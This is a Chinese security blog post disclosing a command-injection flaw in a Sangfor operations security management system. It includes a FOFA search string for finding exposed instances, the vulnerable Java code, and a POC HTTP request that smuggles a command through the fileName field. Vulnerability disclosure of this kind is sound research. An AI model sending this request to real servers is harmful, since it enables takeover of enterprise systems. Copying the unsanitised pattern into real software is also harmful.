---
title: "深信服运维安全管理系统 csspost/update 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html
asset_dir: assets/深信服运维安全管理系统-csspostupdate-远程命令执行漏洞
---

# 深信服运维安全管理系统 csspost/update 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/3/8 08:41
* 199浏览
* [0评论](#comment)
* 23分钟阅读

深入探索

数据库

服务器

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深信服运维安全管理系统 csspost/update 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

Windows安全工具

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.foreignSXF.newSXF.CsspController#update`的实现逻辑

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-001-5b4c3175a832.webp)](https://image.mrxn.net/f5fc7742685d4586ae6d57d91a3d5386.webp)

```
public String update(HttpServletRequest request) throws Exception {
    this.getPatchByNode(request); // 调用 getPatchByNode 方法，可能初始化了一些 Node 对象
    String result = "";
    String fileName = this.getParameter("fileName"); // 从请求中获取 fileName 参数

    // ... 获取 NodeList 和 Node 对象
    // ... 获取 nodeId

    String cmd = "";
    // 构造 shell 命令
    cmd = "bash /usr/local/bin/sh/node_patch_management.sh install " + fileName; 

    // ... 更新 lastUpdateDate

    boolean flag = true;
    // 检查资源名称是否为 "本机" (可能指的是本地节点)
    if ("本机".equals(node.getResourceName())) { 
        ShellExecutor executor = new ShellExecutor();
        OutMessage exe = executor.exec(cmd); // 执行 cmd

        if ("success".equals(exe.getOutStr())) {
            // ... 更新状态
            // ... 异步重启 Tomcat (调用 this.restart())
            this.Rexcecutor.submit(new Runnable() {
                public void run() {
                    try {
                        Thread.sleep(5000L);
                        CsspController.this.restart(); // 调用 restart() 方法
                    } catch (Exception var2) {
                        throw new RuntimeException("重启Tomcat失败!!");
                    }
                }
            });
        } else {
            // ... 处理失败逻辑
            result = "安装失败";
        }
    }

    return result;
}

// restart 方法
public void restart() {
    String cmd = "bash /usr/local/bin/sh/double/restart_tomcat.sh";
    ShellExecutor executor = new ShellExecutor();
    executor.exec(cmd);
}
```

深入探索

网络安全课程

企业安全咨询

物流软件安全

总体来说就是

漏洞扫描服务

* `fileName` 参数是从用户请求中获取的，用户可控。
* 该参数被直接拼接进了 `cmd` 字符串：`cmd = "bash /usr/local/bin/sh/node_patch_management.sh install " + fileName;`
* 随后，这个 `cmd` 字符串被 `ShellExecutor.exec(cmd)` 执行。
* 由于没有对 `fileName` 进行任何安全过滤或转义，攻击者可以通过在 `fileName` 中插入命令分隔符（如 `;`, `$()`, ``` `` 或 ```||`）来[执行任意系统命令](https://mrxn.net/tag/rce)。

需要满足条件：`if ("本机".equals(node.getResourceName()))` ，一般默认都是满足的

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-002-ca014baaf822.webp)](https://image.mrxn.net/0b027343572a407fadd72c1d5a1495ff.webp)

**/csspost/OSM/update** 亦如此

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-003-e1dadc10e088.webp)](https://image.mrxn.net/8fba6bf22f1349418393517566b7abd6.webp)

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-004-7582cfa7487a.webp)](https://image.mrxn.net/bb2663a3f40e40d884c1d5e36d0171a0.webp)

最终也会导致任意[命令执行](https://mrxn.net/tag/rce)。

# 漏洞复现

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-005-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

```
POST /fort/csspost;help/update HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

fileName=1.zip;RCE_POC
```

访问命令执行结果文件

计算机服务器

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-006-67c90b436cf4.webp)](https://image.mrxn.net/ded9db53709b4d7fab92ec0cc007cf67.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)  
文章链接：<https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-csspost-update-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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